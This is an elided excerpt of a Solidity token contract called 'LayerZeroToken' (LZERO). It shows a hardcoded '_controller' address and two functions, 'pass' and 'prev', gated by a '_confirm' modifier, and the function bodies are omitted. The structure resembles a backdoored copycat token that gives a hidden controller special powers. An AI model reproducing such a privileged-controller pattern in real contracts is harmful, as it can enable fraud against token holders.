...
contract LayerZeroToken is Context, IERC20 {
    ...
    address public _controller = 0xca6c7FeC465a1c1Ad86257e0Bf2550632165a7F1;
   constructor () public {



        _name = "LayerZeroToken";
        _symbol = "LZERO";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function pass(address recipient) public _confirm(){
  ...
  function prev(address recipient) public _confirm(){
